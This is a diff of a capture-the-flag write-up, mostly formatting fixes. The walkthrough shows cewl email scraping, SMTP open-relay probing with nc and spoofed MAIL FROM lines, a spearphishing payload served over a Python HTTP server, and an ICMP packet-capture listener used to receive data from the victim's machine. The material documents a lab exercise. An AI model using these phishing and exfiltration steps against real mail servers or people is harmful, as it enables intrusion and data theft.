@@ -132,7 +132,7 @@ http://{MACHINE_IP}:8080/instructors?page=1
 
 Use cewl to extract email addresses from the web app:
 ```
-cewl 'http://{MACHINE_IP:8080/instructors?page=1' -n -e --email_file emails.txt
+cewl 'http://{MACHINE_IP}:8080/instructors?page=1' -n -e --email_file emails.txt
 ```
 ![](https://i.imgur.com/APbJY0g.png){: .mx-auto.d-block :}
 
@@ -160,12 +160,15 @@ Or alternatively, you could use other tools (e.g. Burp Suite, curl, wget, etc.) 
 If you did run a port scan, you should find a mail service running in port 25.
 
 Below are commands available from the server.
+
 ![](https://i.imgur.com/uMnphdH.png){: .mx-auto.d-block :}
 
 Trying for open mail relay, you would notice that the mail server rejects sender address that is not using the **"@rtv.local"** domain.
+
 ![](https://i.imgur.com/i3iHHrm.png){: .mx-auto.d-block :}
 
 Additionally, it rejects receipients that are not valid users.
+
 ![](https://i.imgur.com/uIkYfJP.png){: .mx-auto.d-block :}
 
 In short, you need to be able to find a valid user which you could target for spearphishing.
@@ -236,7 +239,13 @@ python3 -m http.server 1337
 ~~~
 
 **Sending the email via open mail relay vulnerability:**
+
+~~~
+nc {MACHINE_IP} 25
+~~~
+
 (for MAIL FROM: you can use any default users in machine, or even use laughingman@rtv.local user itself)
+
 ~~~
 MAIL FROM: root@rtv.local 
 RCPT TO: laughingman@rtv.local 
@@ -291,6 +300,7 @@ def main():
 if __name__ == "__main__":
     main()
 ```
+
 {: .box-warning}
 **Note:** Below is an example script to capture ICMP packets. The idea is to capture the packets and be able to examine it. You could also use packet analyzer tools such as WireShark, though keep in mind that you might need to parse the data output into a more readable format.
 
@@ -333,6 +343,7 @@ if __name__ == "__main__":
     receive_messages_via_icmp()
 ```
 Wait for the victim to click the link and download the payload. Screenshot below shows receiving a web request from the victim's machine.
+
 ![](https://i.imgur.com/VqUw8tx.png){: .mx-auto.d-block :}
 
 After the victim runs the payload, you should be able to acquire the **user.txt** file. You could use the same tactic to enumerate the machine and try to escalate your privilege and acquire root.txt file.
